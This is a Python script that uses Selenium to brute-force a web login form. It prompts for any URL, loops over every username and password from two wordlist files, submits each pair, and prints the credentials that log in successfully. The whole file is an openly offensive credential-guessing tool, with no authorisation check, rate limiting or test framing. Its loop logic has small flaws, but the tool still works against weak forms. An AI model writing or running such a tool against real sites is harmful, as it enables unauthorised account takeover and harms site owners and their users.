from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, TimeoutException
import time

def brute_force_login(url):
    service = Service(executable_path="/usr/bin/chromedriver")
    options = webdriver.ChromeOptions()
    # options.add_argument('--headless')  # Uncomment if you don't want the browser window to open
    driver = webdriver.Chrome(service=service, options=options)

    with open('usernames.txt', 'r') as u_file:
        usernames = u_file.read().splitlines()
    with open('passwords.txt', 'r') as p_file:
        passwords = p_file.read().splitlines()

    for username in usernames:
        for password in passwords:
            try:
                driver.get(url)
                WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, 'username')))
                username_field = driver.find_element(By.NAME, 'username')
                password_field = driver.find_element(By.NAME, 'password')
                
                username_field.clear()
                password_field.clear()

                username_field.send_keys(username)
                password_field.send_keys(password)

                driver.find_element(By.ID, 'login_button').click()
                
                # Example of a more dynamic wait condition instead of time.sleep
                WebDriverWait(driver, 10).until(
                    lambda driver: driver.find_element(By.ID, 'logout_button') or driver.current_url != url
                )
                
                # Check for login success, this needs to be tailored to the target application
                if check_login_success(driver):
                    print(f"Login successful with {username}:{password}")
                    # Perform any required actions here or break if you only need one successful login
                    break
                else:
                    print(f"Attempt with {username}:{password} failed.")

            except (NoSuchElementException, TimeoutException) as e:
                print(f"Error or timeout occurred with {username}:{password} - {e}")

    driver.quit()

def check_login_success(driver):
    # Implement specific checks for successful login, such as URL change or specific element visibility
    try:
        # Example: Check if logout button is present
        driver.find_element(By.ID, 'logout_button')
        return True
    except NoSuchElementException:
        return False

if __name__ == "__main__":
    website_url = input("Enter the website URL: ")
    brute_force_login(website_url)
